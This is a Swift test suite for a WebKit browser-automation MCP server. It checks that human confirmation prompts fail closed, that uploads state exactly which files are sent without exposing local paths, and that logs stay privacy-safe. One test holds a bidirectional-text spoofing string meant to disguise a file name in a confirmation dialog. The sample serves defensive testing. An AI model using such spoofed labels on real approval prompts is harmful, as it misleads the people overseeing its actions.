import CryptoKit
import Foundation
import Network
import Testing
import WebKit
import WebKitUIMCPConfirmPolicy
import WebKitUIMCPCore

@testable import WebKitUIMCPRuntime
@testable import WebKitUIMCPServer

private final class HistoryFixtureServer: @unchecked Sendable {
  private let listener: NWListener
  let port: UInt16

  init(responseBody: String? = nil) throws {
    listener = try NWListener(using: .tcp, on: .any)
    let ready = DispatchSemaphore(value: 0)
    listener.stateUpdateHandler = { state in
      if case .ready = state { ready.signal() }
    }
    listener.newConnectionHandler = { connection in
      connection.start(queue: .global())
      connection.receive(minimumIncompleteLength: 1, maximumLength: 16_384) {
        data, _, _, _ in
        let request = String(decoding: data ?? Data(), as: UTF8.self)
        let body: String
        if let responseBody {
          body = responseBody
        } else if request.hasPrefix("GET /form ") {
          body =
            "<title>Form</title><form action='/submitted' method='post'>"
            + "<input name='choice' value='once'><button type='submit'>Send</button></form>"
        } else if request.hasPrefix("POST /submitted ") {
          body = "<title>Submitted</title><p>Done</p>"
        } else {
          let first = request.hasPrefix("GET /first ")
          let title = first ? "First" : "Second"
          body = "<title>\(title)</title><button>\(title) action</button>"
        }
        let response =
          "HTTP/1.1 200 OK\r\nContent-Type: text/html\r\nContent-Length: \(body.utf8.count)\r\n"
          + "Connection: close\r\n\r\n\(body)"
        connection.send(
          content: Data(response.utf8), contentContext: .finalMessage, isComplete: true,
          completion: .contentProcessed { _ in connection.cancel() })
      }
    }
    listener.start(queue: .global())
    guard ready.wait(timeout: .now() + 2) == .success, let assignedPort = listener.port else {
      listener.cancel()
      throw CocoaError(.coderReadCorrupt)
    }
    port = assignedPort.rawValue
  }

  deinit { listener.cancel() }
}

private enum PermissionStubLifetime {
  nonisolated(unsafe) static var retained: [AnyObject] = []

  static func keep(_ value: AnyObject) { retained.append(value) }
}

private final class PermissionStubFrameInfo: WKFrameInfo {
  static let mainFrame: PermissionStubFrameInfo = {
    let frame = PermissionStubFrameInfo()
    PermissionStubLifetime.keep(frame)
    return frame
  }()

  override var isMainFrame: Bool { true }
}

private final class PermissionSecurityOriginCapture: NSObject, WKScriptMessageHandler {
  private(set) var origin: WKSecurityOrigin?

  func userContentController(
    _ userContentController: WKUserContentController,
    didReceive message: WKScriptMessage
  ) {
    origin = message.frameInfo.securityOrigin
  }
}

private final class TransactionLedgerFactoryProbe: @unchecked Sendable {
  private let lock = NSLock()
  private var creationCount = 0

  func recordCreation() {
    lock.withLock { creationCount += 1 }
  }

  func count() -> Int {
    lock.withLock { creationCount }
  }
}

@MainActor
private final class InProcessSyntheticBrokerStub: CredentialBrokerFilling {
  static let username = "synthetic-user@example.test"
  static let password = "SP-MVP0-synthetic-only-7f3a"
  static let rotatedPassword = "SP-ROTATION-synthetic-only-8g4b"

  func fill(
    binding: CredentialSinkFormBinding,
    runtime: WebKitRuntime
  ) async throws -> CredentialBrokerWireReceipt {
    _ = try await runtime.performCredentialFill(
      binding: binding,
      username: CredentialSecretBuffer(copying: Array(Self.username.utf8)),
      password: CredentialSecretBuffer(copying: Array(Self.password.utf8))
    )
    return CredentialBrokerWireReceipt(status: .filled)
  }

  func rotatePassword(
    binding: CredentialSinkRotationBinding,
    runtime: WebKitRuntime
  ) async throws -> CredentialBrokerWireReceipt {
    _ = try await runtime.performCredentialRotationFill(
      binding: binding,
      currentPassword: CredentialSecretBuffer(copying: Array(Self.password.utf8)),
      newPassword: CredentialSecretBuffer(copying: Array(Self.rotatedPassword.utf8))
    )
    return CredentialBrokerWireReceipt(status: .changed)
  }
}

@MainActor
private final class FixedStatusCredentialBrokerStub: CredentialBrokerFilling {
  let status: CredentialBrokerWireStatus
  let error: Error?

  init(status: CredentialBrokerWireStatus, error: Error? = nil) {
    self.status = status
    self.error = error
  }

  func fill(
    binding: CredentialSinkFormBinding,
    runtime: WebKitRuntime
  ) async throws -> CredentialBrokerWireReceipt {
    _ = binding
    _ = runtime
    if let error { throw error }
    return CredentialBrokerWireReceipt(status: status)
  }
}

@MainActor
private final class ConfirmationPresenterStub: BrowserConfirmationPresenting {
  private(set) var requests: [(title: String, message: String, approveLabel: String)] = []
  private var responses: [Bool]
  var state: NativeConfirmationState = .idle
  var beforeResponse: (@MainActor () async -> Void)?
  var forcedOutcome: NativeConfirmationOutcome?
  var presentationReceipt: ConfirmationPresentationReceipt?
  var focusRequests: [UUID] = []

  init(responses: [Bool], state: NativeConfirmationState = .idle) {
    self.responses = responses
    self.state = state
  }

  func confirm(title: String, message: String, approveLabel: String) async
    -> NativeConfirmationOutcome
  {
    requests.append((title, message, approveLabel))
    await beforeResponse?()
    if let forcedOutcome { return forcedOutcome }
    return responses.isEmpty || !responses.removeFirst() ? .declined : .approved
  }

  func cancel() { state = .idle }
  func rePresent(requestID: UUID) -> Bool {
    guard state == .pending, presentationReceipt?.requestID == requestID else { return false }
    focusRequests.append(requestID)
    return true
  }
}

/// Holds WebKit's real open-panel delegate pending without presenting a system UI.
@MainActor
private final class SuspendedUploadPanel {
  private var continuation: CheckedContinuation<[URL]?, Never>?
  private var opening: Task<Void, Never>?

  func selection() async -> [URL]? {
    await withCheckedContinuation { continuation = $0 }
  }

  func open(on runtime: WebKitRuntime) async -> Bool {
    opening = Task {
      _ = try? await runtime.webView.evaluateJavaScript("document.querySelector('input').click()")
    }
    for _ in 0..<100 {
      if runtime.isFilePickerVisible() { return true }
      try? await Task.sleep(for: .milliseconds(20))
    }
    return false
  }

  func close() {
    continuation?.resume(returning: nil)
    continuation = nil
    opening?.cancel()
  }
}

@MainActor
private final class SafariCompatibilityPresenterStub: SafariCompatibilityPresenting {
  private(set) var openedURLs: [URL] = []
  let succeeds: Bool

  init(succeeds: Bool = true) {
    self.succeeds = succeeds
  }

  func openPrivateAuthenticationURL(_ url: URL) async -> Bool {
    openedURLs.append(url)
    return succeeds
  }
}

/// A panel is opened by the page on its own schedule, and the page's script only
/// resumes once the panel is answered. Both waits are bounded so a panel that never
/// arrives, or an answer that never reaches the site, fails a test instead of hanging
/// the bundle with no `Test run with` summary.
@MainActor
private func awaitPendingDialogID(on runtime: WebKitRuntime, polls: Int = 200) async -> String? {
  for _ in 0..<polls {
    if let dialog = runtime.pendingJavaScriptDialog() { return dialog.dialogID }
    try? await Task.sleep(for: .milliseconds(20))
  }
  return nil
}

@MainActor
private func awaitPageDialogAnswer(on runtime: WebKitRuntime, polls: Int = 200) async -> Any? {
  for _ in 0..<polls {
    if let answer = try? await runtime.webView.evaluateJavaScript(
      "window.__answer === undefined ? null : window.__answer"), !(answer is NSNull)
    {
      return answer
    }
    try? await Task.sleep(for: .milliseconds(20))
  }
  return nil
}

@Suite("MCP 2026-07-28 wire server", .serialized)
@MainActor
struct MCPServerTests {
  @Test("A shared transaction ledger factory returns one authority per scope")
  func sharedTransactionLedgerFactory() throws {
    let probe = TransactionLedgerFactoryProbe()
    let factory = WebKitTransactionLedgerFactory.shared { _ in
      probe.recordCreation()
      return .init()
    }

    let first = try factory.make(scope: "default")
    let second = try factory.make(scope: "default")
    let other = try factory.make(scope: "other")

    #expect(first === second)
    #expect(first !== other)
    #expect(probe.count() == 2)
  }

  @Test("Tool calls append privacy-safe activity events")
  func toolCallActivityLog() async throws {
    let directory = FileManager.default.temporaryDirectory.appendingPathComponent(
      "webkitui-server-activity-\(UUID().uuidString)",
      isDirectory: true)
    defer { try? FileManager.default.removeItem(at: directory) }
    let activityLog = try WebKitActivityLog(directoryURL: directory)
    let server = try WebKitMCPServer(activityLog: activityLog)

    _ = try await call(
      server,
      id: 1,
      method: "tools/call",
      params: .object([
        "name": .string("browser_session"),
        "arguments": .object(["operation": .string("profiles")]),
      ]),
      modern: true
    )
    _ = try await call(
      server,
      id: 2,
      method: "tools/call",
      params: .object([
        "name": .string("secret-tool-name"),
        "arguments": .object([:]),
      ]),
      modern: true
    )

    let events = try await activityLog.events()
    #expect(events.count == 2)
    #expect(events.contains { $0.toolName == "browser_session" && $0.outcome == .succeeded })
    #expect(events.contains { $0.toolName == "unknown" && $0.outcome == .failed })
    let exported = String(decoding: try await activityLog.exportData(), as: UTF8.self)
    #expect(!exported.contains("secret-tool-name"))
  }

  @Test("Native confirmation helper failures deny authority")
  func nativeConfirmationHelperFailClosed() async throws {
    let helperDirectory = FileManager.default.temporaryDirectory.appendingPathComponent(
      "webkitui-confirm-test-\(UUID().uuidString)",
      isDirectory: true)
    try FileManager.default.createDirectory(
      at: helperDirectory,
      withIntermediateDirectories: true)
    defer { try? FileManager.default.removeItem(at: helperDirectory) }
    let acceptingHelper = helperDirectory.appendingPathComponent("accepting-helper")
    try Data("#!/bin/sh\n/bin/cat >/dev/null\n".utf8).write(to: acceptingHelper)
    try FileManager.default.setAttributes(
      [.posixPermissions: 0o700],
      ofItemAtPath: acceptingHelper.path)
    let blockingHelper = helperDirectory.appendingPathComponent("blocking-helper")
    try Data("#!/bin/sh\n/bin/cat >/dev/null\n/bin/sleep 5\n".utf8).write(to: blockingHelper)
    try FileManager.default.setAttributes(
      [.posixPermissions: 0o700],
      ofItemAtPath: blockingHelper.path)

    let accepts = NativeBrowserConfirmationPresenter(
      helperURL: acceptingHelper,
      helperVerification: { _ in true },
      runningHelperVerification: { _ in true })
    let rejects = NativeBrowserConfirmationPresenter(
      helperURL: URL(fileURLWithPath: "/usr/bin/false"),
      helperVerification: { _ in true },
      runningHelperVerification: { _ in true })
    let missing = NativeBrowserConfirmationPresenter(
      helperURL: URL(fileURLWithPath: "/path/does/not/exist"),
      helperVerification: { _ in true },
      runningHelperVerification: { _ in true })
    let runningSubstitution = NativeBrowserConfirmationPresenter(
      helperURL: acceptingHelper,
      helperVerification: { _ in true },
      runningHelperVerification: { _ in false })
    let foreignSignedHelper = NativeBrowserConfirmationPresenter(
      helperURL: URL(fileURLWithPath: "/usr/bin/true"))
    let timesOut = NativeBrowserConfirmationPresenter(
      helperURL: blockingHelper,
      helperVerification: { _ in true },
      runningHelperVerification: { _ in true },
      timeout: .milliseconds(50))
    let cancels = NativeBrowserConfirmationPresenter(
      helperURL: blockingHelper,
      helperVerification: { _ in true },
      runningHelperVerification: { _ in true },
      timeout: .seconds(5))

    #expect(
      await accepts.confirm(title: "Title", message: "Message", approveLabel: "Approve")
        == .approved)
    #expect(
      await rejects.confirm(title: "Title", message: "Message", approveLabel: "Approve")
        != .approved)
    #expect(
      await missing.confirm(title: "Title", message: "Message", approveLabel: "Approve")
        != .approved)
    #expect(
      await runningSubstitution.confirm(title: "Title", message: "Message", approveLabel: "Approve")
        != .approved)
    #expect(
      await foreignSignedHelper.confirm(title: "Title", message: "Message", approveLabel: "Approve")
        != .approved)
    #expect(
      await timesOut.confirm(title: "Title", message: "Message", approveLabel: "Approve")
        == .timedOut)
    let pending = Task {
      await cancels.confirm(title: "Title", message: "Message", approveLabel: "Approve")
    }
    for _ in 0..<50 {
      if cancels.state == .pending { break }
      try await Task.sleep(for: .milliseconds(10))
    }
    #expect(cancels.state == .pending)
    cancels.cancel()
    #expect(await pending.value == .cancelled)
    #expect(cancels.state == .idle)
  }

  @Test("A helper closing standard input fails without terminating the server")
  func nativeConfirmationBrokenPipeFailsClosed() throws {
    let pipe = Pipe()
    try pipe.fileHandleForReading.close()
    defer { try? pipe.fileHandleForWriting.close() }

    var rejectedBrokenPipe = false
    do {
      try NativeBrowserConfirmationPresenter.writePayload(
        Data("synthetic request".utf8),
        to: pipe.fileHandleForWriting)
    } catch {
      rejectedBrokenPipe = true
    }

    #expect(rejectedBrokenPipe)
  }

  @Test("Native confirmation arguments never carry the approval payload")
  func nativeConfirmationPayloadUsesStandardInput() {
    #expect(
      NativeBrowserConfirmationPresenter.helperArguments == [
        "--protocol-version", "1", "--request-stdin",
      ])
    #expect(!NativeBrowserConfirmationPresenter.helperArguments.joined().contains("Message"))
  }

  @Test("Native confirmation strips bidirectional and control spoofing")
  func nativeConfirmationSanitizesUntrustedLabels() {
    let spoofed = "safe\u{202E}txt.exe\u{2066}\nnext"
    #expect(WebKitMCPServer.safeConfirmationText(spoofed) == "safetxt.exenext")
  }

  @Test("Discovery advertises stateless modern protocol metadata")
  func discovery() async throws {
    let server = try WebKitMCPServer()
    let response = try await call(
      server,
      id: 1,
      method: "server/discover",
      params: .object([:]),
      modern: true
    )

    let result = try object(response["result"])
    #expect(result["resultType"] == .string("complete"))
    #expect(
      result["supportedVersions"]
        == .array([.string("2026-07-28")])
    )
    #expect(try object(result["_meta"])["io.modelcontextprotocol/serverInfo"] != nil)
  }

  @Test("Modern requests require metadata and reject unsupported revisions")
  func modernMetadataValidation() async throws {
    let server = try WebKitMCPServer()
    let missing = try await call(
      server,
      id: 1,
      method: "server/discover",
      params: .object([:]),
      modern: false
    )
    #expect(try object(missing["error"])["code"] == .int(-32602))

    let unsupported = try await rawCall(
      server,
      id: 2,
      method: "tools/list",
      params: .object([
        "_meta": .object([
          "io.modelcontextprotocol/protocolVersion": .string("2026-08-01"),
          "io.modelcontextprotocol/clientCapabilities": .object([:]),
        ])
      ])
    )
    let error = try object(unsupported["error"])
    #expect(error["code"] == .int(-32022))
    let data = try object(error["data"])
    #expect(data["supported"] == .array([.string("2026-07-28")]))
    #expect(data["requested"] == .string("2026-08-01"))
  }

  @Test("Tool list is deterministic, bounded and cacheable")
  func toolList() async throws {
    let server = try WebKitMCPServer()
    let first = try await call(
      server,
      id: 1,
      method: "tools/list",
      params: .object([:]),
      modern: true
    )
    let second = try await call(
      server,
      id: 2,
      method: "tools/list",
      params: .object([:]),
      modern: true
    )
    let firstResult = try object(first["result"])
    let secondResult = try object(second["result"])
    #expect(firstResult["tools"] == secondResult["tools"])
    #expect(firstResult["ttlMs"] == .int(300_000))

    let names = try array(firstResult["tools"]).map {
      try string(object($0)["name"])
    }
    #expect(
      names == [
        "browser_download",
        "browser_upload",
        "browser_act",
        "browser_capture",
        "browser_fill_siliconpass",
        "browser_rotate_siliconpass_password",
        "browser_navigate",
        "browser_observe",
        "browser_read_text",
        "browser_inspect_element",
        "browser_scroll",
        "element_scroll_into_view",
        "browser_session",
        "browser_transaction",
      ]
    )
    let downloadTool = try object(try array(firstResult["tools"])[0])
    let schema = try object(downloadTool["inputSchema"])
    #expect(
      schema["required"]
        == .array([.string("session_id"), .string("idempotency_key")]))
    let properties = try object(schema["properties"])
    #expect(properties["url"] != nil)
    #expect(properties["expected_provisioning_profile_uuid"] != nil)
  }

  @Test("Act schema exposes postcondition fields and all runtime predicate forms")
  func actPostconditionContract() async throws {
    let server = try WebKitMCPServer()
    let listed = try await call(
      server, id: 1, method: "tools/list", params: .object([:]), modern: true)
    let tools = try array(try object(listed["result"])["tools"])
    let act = try object(
      try #require(tools.first { (try? object($0)["name"]) == .string("browser_act") }))
    let properties = try object(try object(act["inputSchema"])["properties"])
    let schema = try object(act["inputSchema"])
    #expect(schema["allOf"] == nil)
    #expect(schema["oneOf"] == nil)
    let operations = try array(try object(properties["operation"])["enum"])
    #expect(operations.count == 11)
    func containsComposition(_ value: JSONValue) -> Bool {
      switch value {
      case .object(let fields):
        return !Set(fields.keys).isDisjoint(with: ["oneOf", "allOf", "anyOf", "if", "then", "else"])
          || fields.values.contains(where: containsComposition)
      case .array(let values): return values.contains(where: containsComposition)
      default: return false
      }
    }
    for tool in tools {
      #expect(!containsComposition(try #require(try object(tool)["inputSchema"])))
    }
    let postcondition = try object(properties["postcondition"])
    let fields = try object(postcondition["properties"])
    #expect(try object(fields["value"])["type"] == .string("string"))
    let types = try array(try object(fields["type"])["enum"])
    #expect(types.count == 21)
    #expect(postcondition["oneOf"] == nil)
    for type in ["url_prefix", "validation_state", "character_count_equals", "panel_open"] {
      #expect(types.contains(.string(type)))
    }
    #expect(postcondition["required"] == .array([.string("type"), .string("value")]))
    #expect(try string(postcondition["description"]).contains("panel_open/dialog_appears"))
    #expect(try string(postcondition["description"]).contains("semantic_text_appears is exact"))
    #expect(
      try string(try object(properties["value"])["description"]).contains("contentEditable=true"))
  }

  @Test("Interaction schemas expose targeted scroll, explicit dialog scope and exact pending focus")
  func interactionScopeContract() async throws {
    let server = try WebKitMCPServer()
    let listed = try await call(
      server, id: 1, method: "tools/list", params: .object([:]), modern: true)
    let tools = try array(try object(listed["result"])["tools"])
    func properties(_ name: String) throws -> [String: JSONValue] {
      let tool = try object(
        try #require(tools.first { (try? object($0)["name"]) == .string(name) }))
      return try object(try object(tool["inputSchema"])["properties"])
    }
    let scroll = try properties("browser_scroll")
    #expect(scroll["observation_id"] != nil && scroll["element_id"] != nil)
    let observe = try properties("browser_observe")
    #expect(observe["scope_observation_id"] != nil && observe["scope_element_id"] != nil)
    let session = try properties("browser_session")
    #expect(
      try array(try object(session["operation"])["enum"]).contains(.string("confirmation_focus")))
    #expect(try object(session["confirmation_request_id"])["format"] == .string("uuid"))
  }

  @Test("Compact MCP observations expose a scroll target and scrolling invalidates it")
  func observedContainerScrollOnWire() async throws {
    let registry = try WebKitSessionRegistry()
    let handle = try registry.open()
    let runtime = try registry.runtime(for: handle)
    _ = try await runtime.loadHTML(
      "<div aria-label='Choices' style='width:180px;height:100px;overflow:auto'><div style='height:900px'>Content</div></div><div style='height:1800px'>Background</div>",
      baseURL: URL(string: "https://scroll.fixture.invalid"), timeout: .seconds(15),
      quietWindow: .milliseconds(40))
    let server = WebKitMCPServer(registry: registry)
    let session = JSONValue.string(handle.rawValue.uuidString)
    let reply = try await toolCall(
      server, id: 1, name: "browser_observe",
      arguments: ["session_id": session, "compact": .bool(true)])
    let observed = try object(try object(reply["result"])["structuredContent"])
    let rows = try array(observed["elements"])
    let target = try object(
      try #require(rows.first { (try? object($0)["scrollable"]) == .bool(true) }))
    let arguments: [String: JSONValue] = [
      "session_id": session,
      "observation_id": observed["observationID"]!, "element_id": target["elementID"]!,
      "delta_y": .int(200),
    ]
    let scrolled = try await toolCall(server, id: 2, name: "browser_scroll", arguments: arguments)
    let result = try object(try object(scrolled["result"])["structuredContent"])
    #expect(result["actualDeltaY"] == .double(200) || result["actualDeltaY"] == .int(200))
    #expect(result["observationInvalidated"] == .bool(true))
    #expect(try await runtime.webView.evaluateJavaScript("scrollY") as? Double == 0)
    let stale = try await toolCall(server, id: 3, name: "browser_scroll", arguments: arguments)
    #expect(stale["error"] != nil || (try? object(stale["result"])["isError"]) == .bool(true))
    #expect(
      try await runtime.webView.evaluateJavaScript(
        "document.querySelector('[aria-label=Choices]').scrollTop") as? Double == 200)
  }

  @Test("Upload attaches a confirmed local file and proves its preview postcondition")
  func uploadAttachesConfirmedLocalFile() async throws {
    let directory = FileManager.default.temporaryDirectory.appendingPathComponent(
      UUID().uuidString, isDirectory: true)
    try FileManager.default.createDirectory(at: directory, withIntermediateDirectories: true)
    defer { try? FileManager.default.removeItem(at: directory) }
    let file = directory.appendingPathComponent("feature-graphic.png")
    let bytes = Data("play-feature-graphic-fixture".utf8)
    try bytes.write(to: file, options: .atomic)
    let digest = SHA256.hash(data: bytes).map { String(format: "%02x", $0) }.joined()

    let registry = try WebKitSessionRegistry()
    let handle = try registry.open()
    let runtime = try registry.runtime(for: handle)
    _ = try await runtime.loadHTML(
      """
      <h1>No asset</h1>
      <input aria-label="Feature graphic" type="file"
        onchange="document.querySelector('h1').textContent = 'Uploaded ' + this.files[0].name">
      """,
      baseURL: URL(string: "https://play.fixture.invalid/listing")!,
      timeout: .seconds(3), quietWindow: .milliseconds(40))
    let presenter = ConfirmationPresenterStub(responses: [true])
    let server = WebKitMCPServer(registry: registry, confirmationPresenter: presenter)

    let observed = try await toolCall(
      server, id: 1, name: "browser_observe",
      arguments: ["session_id": .string(handle.rawValue.uuidString)])
    let observation = try object(try object(observed["result"])["structuredContent"])
    let observationID = try string(observation["observationID"])
    let elementID = try fileControlID(in: observation, labelled: "Feature graphic")

    let response = try await toolCall(
      server, id: 2, name: "browser_upload",
      arguments: [
        "session_id": .string(handle.rawValue.uuidString),
        "idempotency_key": .string("play-feature-graphic-01"),
        "observation_id": .string(observationID),
        "element_id": .string(elementID),
        "file_paths": .array([.string(file.path)]),
        "expected_sha256": .array([.string(digest)]),
        "postcondition": .object([
          "type": .string("heading_equals"),
          "value": .string("Uploaded feature-graphic.png"),
        ]),
      ])

    let result = try object(response["result"])
    #expect(result["isError"] != .bool(true))
    let structured = try object(result["structuredContent"])
    let receipt = try object(structured["file_upload_receipt"])
    #expect(receipt["filenames"] == .array([.string("feature-graphic.png")]))
    #expect(receipt["sha256"] == .array([.string(digest)]))
    #expect(receipt["fileCount"] == .int(1))
    #expect(receipt["selectionMode"] == .string("agent_confirmed"))
    #expect(receipt["localPathsExposed"] == .bool(false))
    #expect(structured["file_selected"] == .bool(true))

    // The confirmation must state exactly what will be sent, and never the local path.
    let request = try #require(presenter.requests.first)
    #expect(request.message.contains("feature-graphic.png"))
    #expect(request.message.contains(digest))
    #expect(request.message.contains(String(bytes.count)))
    #expect(!request.message.contains(directory.path))
    let encoded = String(decoding: try JSONEncoder().encode(result), as: UTF8.self)
    #expect(!encoded.contains(directory.path))
  }

  @Test("Upload through a styled browse control attaches the confirmed file to the hidden input")
  func uploadThroughBrowseControl() async throws {
    // CloudKit's Import Schema dialog: the real input is hidden behind a "browse" span
    // (AuroraPulse session, 2026-09-30).
    let directory = FileManager.default.temporaryDirectory.appendingPathComponent(
      UUID().uuidString, isDirectory: true)
    try FileManager.default.createDirectory(at: directory, withIntermediateDirectories: true)
    defer { try? FileManager.default.removeItem(at: directory) }
    let file = directory.appendingPathComponent("cloudkit_schema.ckdb")
    try Data("DEFINE SCHEMA".utf8).write(to: file, options: .atomic)

    let registry = try WebKitSessionRegistry()
    let handle = try registry.open()
    let runtime = try registry.runtime(for: handle)
    _ = try await runtime.loadHTML(
      """
      <h1>Import Schema</h1>
      <input id="schema" type="file" style="display:none"
        onchange="document.querySelector('h1').textContent = 'Selected ' + this.files[0].name">
      <span role="button" tabindex="0"
        onclick="document.getElementById('schema').click()">browse</span>
      """,
      baseURL: URL(string: "https://icloud.fixture.invalid/dashboard")!,
      timeout: .seconds(3), quietWindow: .milliseconds(40))
    let presenter = ConfirmationPresenterStub(responses: [true])
    let server = WebKitMCPServer(registry: registry, confirmationPresenter: presenter)

    let observed = try await toolCall(
      server, id: 1, name: "browser_observe",
      arguments: ["session_id": .string(handle.rawValue.uuidString)])
    let observation = try object(try object(observed["result"])["structuredContent"])
    let response = try await toolCall(
      server, id: 2, name: "browser_upload",
      arguments: [
        "session_id": .string(handle.rawValue.uuidString),
        "idempotency_key": .string("cloudkit-schema-01"),
        "observation_id": .string(try string(observation["observationID"])),
        "element_id": .string(try elementID(in: observation, named: "browse")),
        "file_paths": .array([.string(file.path)]),
        "postcondition": .object([
          "type": .string("heading_equals"),
          "value": .string("Selected cloudkit_schema.ckdb"),
        ]),
      ])
    let result = try object(response["result"])
    #expect(result["isError"] != .bool(true))
    let structured = try object(result["structuredContent"])
    #expect(structured["file_selected"] == .bool(true))
    #expect(
      try object(structured["file_upload_receipt"])["filenames"]
        == .array([.string("cloudkit_schema.ckdb")]))
  }

  @Test(
    "A browse control that opens no panel preserves dispatch uncertainty", arguments: [false, true])
  func uploadThroughControlThatOpensNoPanel(suppressGestureReceipt: Bool) async throws {
    let directory = FileManager.default.temporaryDirectory.appendingPathComponent(
      UUID().uuidString, isDirectory: true)
    try FileManager.default.createDirectory(at: directory, withIntermediateDirectories: true)
    defer { try? FileManager.default.removeItem(at: directory) }
    let file = directory.appendingPathComponent("schema.ckdb")
    try Data("DEFINE SCHEMA".utf8).write(to: file, options: .atomic)

    let registry = try WebKitSessionRegistry()
    let handle = try registry.open()
    let runtime = try registry.runtime(for: handle)
    _ = try await runtime.loadHTML(
      """
      <h1>Import</h1><button onclick="document.querySelector('h1').textContent='Clicked'">browse</button>
      <script>
      if (\(suppressGestureReceipt)) {
        document.addEventListener('click', event => {
          event.stopImmediatePropagation();
          document.querySelector('h1').textContent='Clicked';
        }, true);
      }
      </script>
      """,
      baseURL: URL(string: "https://icloud.fixture.invalid/dashboard")!,
      timeout: .seconds(3), quietWindow: .milliseconds(40))
    if suppressGestureReceipt {
      // Suppress transport, not propagation: the early recorder must observe
      // genuine native events even when the page stops propagation.
      runtime.webView.configuration.userContentController.removeScriptMessageHandler(
        forName: "webkituiNativeGesture", contentWorld: .world(name: "WebKitUIMCP.Instrumentation"))
    }
    let presenter = ConfirmationPresenterStub(responses: [true])
    let server = WebKitMCPServer(registry: registry, confirmationPresenter: presenter)
    let observed = try await toolCall(
      server, id: 1, name: "browser_observe",
      arguments: ["session_id": .string(handle.rawValue.uuidString)])
    let observation = try object(try object(observed["result"])["structuredContent"])
    let response = try await toolCall(
      server, id: 2, name: "browser_upload",
      arguments: [
        "session_id": .string(handle.rawValue.uuidString),
        "idempotency_key": .string("no-panel-01"),
        "observation_id": .string(try string(observation["observationID"])),
        "element_id": .string(try elementID(in: observation, named: "browse")),
        "file_paths": .array([.string(file.path)]),
        "postcondition": .object([
          "type": .string("heading_equals"), "value": .string("Clicked"),
        ]),
      ])
    let result = try object(response["result"])
    #expect(result["isError"] == .bool(true))
    let structured = try object(result["structuredContent"])
    #expect(
      structured["status"]
        == .string(
          suppressGestureReceipt ? "upload_selection_indeterminate" : "upload_panel_not_opened"))
    #expect(structured["file_selected"] == .bool(false))
    #expect(structured["file_picker_visible"] == .bool(false))
    #expect(!String(describing: structured["message"]).contains("The click was dispatched"))
    if suppressGestureReceipt {
      let action = try object(try object(structured["action"])["structuredContent"])
      #expect(action["dispatch_error"] == .string("nativeGestureReceiptUnavailable"))
    }
    #expect(!runtime.hasArmedUploadSelection())
  }

  @Test("A pending file panel refuses upload without another click", arguments: [false, true])
  func uploadRefusesPendingFilePanel(opensDuringConfirmation: Bool) async throws {
    let directory = FileManager.default.temporaryDirectory.appendingPathComponent(
      UUID().uuidString, isDirectory: true)
    try FileManager.default.createDirectory(at: directory, withIntermediateDirectories: true)
    defer { try? FileManager.default.removeItem(at: directory) }
    let file = directory.appendingPathComponent("asset.png")
    try Data("synthetic-asset".utf8).write(to: file)
    let panel = SuspendedUploadPanel()
    defer { panel.close() }
    let runtime = WebKitRuntime(
      websiteDataStore: .nonPersistent(), egressProxy: nil,
      managesApplicationActivationPolicy: false,
      uploadSelectionProvider: { _, _ in await panel.selection() })
    let registry = try WebKitSessionRegistry(runtimeFactory: { _ in runtime })
    let handle = try registry.open()
    _ = try await runtime.loadHTML(
      """
      <h1>Import</h1><input aria-label="Asset" type="file">
      <button onclick="window.uploadClicks=(window.uploadClicks||0)+1;
        document.querySelector('h1').textContent='Clicked'">browse</button>
      """,
      baseURL: URL(string: "https://fixture.invalid/upload")!,
      timeout: .seconds(3), quietWindow: .milliseconds(40))
    let presenter = ConfirmationPresenterStub(responses: [true])
    let server = WebKitMCPServer(registry: registry, confirmationPresenter: presenter)
    let observed = try await toolCall(
      server, id: 1, name: "browser_observe",
      arguments: ["session_id": .string(handle.rawValue.uuidString)])
    let observation = try object(try object(observed["result"])["structuredContent"])
    if opensDuringConfirmation {
      presenter.beforeResponse = { #expect(await panel.open(on: runtime)) }
    } else {
      #expect(await panel.open(on: runtime))
    }
    let response = try await toolCall(
      server, id: 2, name: "browser_upload",
      arguments: [
        "session_id": .string(handle.rawValue.uuidString),
        "observation_id": .string(try string(observation["observationID"])),
        "element_id": .string(try elementID(in: observation, named: "browse")),
        "idempotency_key": .string("pending-panel"),
        "file_paths": .array([.string(file.path)]),
        "postcondition": .object([
          "type": .string("heading_equals"), "value": .string("Clicked"),
        ]),
      ])
    let result = try object(response["result"])
    let structured = try object(result["structuredContent"])
    #expect(result["isError"] == .bool(true))
    #expect(structured["status"] == .string("upload_panel_already_open"))
    #expect(structured["file_picker_visible"] == .bool(true))
    #expect(structured["dispatched"] == .bool(false))
    #expect(structured["file_selected"] == .bool(false))
    #expect(presenter.requests.count == (opensDuringConfirmation ? 1 : 0))
    #expect(!runtime.hasArmedUploadSelection())
    #expect(runtime.latestFileUploadReceipt() == nil)
    #expect(runtime.isFilePickerVisible())
    let clicks = try await runtime.webView.evaluateJavaScript("window.uploadClicks||0") as? Int
    #expect(clicks == 0)
  }

  @Test(
    "Direct menu upload attaches four files even without a gesture receipt",
    arguments: [false, true])
  func uploadFourFilesFromMenu(suppressGestureReceipt: Bool) async throws {
    let directory = FileManager.default.temporaryDirectory.appendingPathComponent(
      UUID().uuidString, isDirectory: true)
    try FileManager.default.createDirectory(at: directory, withIntermediateDirectories: true)
    defer { try? FileManager.default.removeItem(at: directory) }
    let files = (1...4).map { directory.appendingPathComponent("creative-\($0).png") }
    var digests: [String] = []
    for (index, file) in files.enumerated() {
      let bytes = Data("synthetic-png-\(index)".utf8)
      try bytes.write(to: file)
      digests.append(SHA256.hash(data: bytes).map { String(format: "%02x", $0) }.joined())
    }
    let registry = try WebKitSessionRegistry()
    let handle = try registry.open()
    let runtime = try registry.runtime(for: handle)
    _ = try await runtime.loadHTML(
      """
      <h1>22 ressources</h1>
      <button aria-label="Ajouter" onclick="document.getElementById('upload').hidden=false">+</button>
      <button id="upload" hidden onclick="document.querySelector('input').click()">
        Charger des ressources créatives</button>
      <input type="file" multiple style="display:none"
        onchange="document.querySelector('h1').textContent=(22+this.files.length)+' ressources';
          document.querySelector('p').textContent=Array.from(this.files,f=>f.name).join(', ')">
      <p></p>
      <script>
      if (\(suppressGestureReceipt)) {
        document.addEventListener('click', event => {
          if (event.target.id === 'upload') {
            event.stopImmediatePropagation();
            document.querySelector('input').click();
          }
        }, true);
      }
      </script>
      """,
      baseURL: URL(string: "https://fixture.invalid/asset-library")!,
      timeout: .seconds(3), quietWindow: .milliseconds(40))
    let presenter = ConfirmationPresenterStub(responses: [true, true])
    let server = WebKitMCPServer(registry: registry, confirmationPresenter: presenter)
    let session = JSONValue.string(handle.rawValue.uuidString)
    let initial = try await toolCall(
